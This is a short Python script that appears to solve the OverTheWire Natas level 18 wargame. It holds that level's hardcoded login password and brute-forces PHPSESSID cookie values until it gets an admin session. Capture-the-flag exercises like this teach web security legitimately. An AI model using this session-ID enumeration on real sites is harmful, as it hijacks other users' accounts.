import requests
from requests.auth import HTTPBasicAuth


target = 'http://natas18.natas.labs.overthewire.org'

Auth = HTTPBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
r = requests.get(target, auth=Auth)
print(r.status_code)
print(r.text)
assert(r.status_code == requests.codes.ok)
for i in range(1, 589):
	print("checking {}".format(i))
	cookies = {"PHPSESSID": str(i)}
	r = requests.get(target, cookies=cookies, auth=Auth)
	# print(r.status_code)
	# print(r.text)
	if "You are an admin." in r.text:
		print(r.text)
		print("found! SESSID={}".format(i))
		break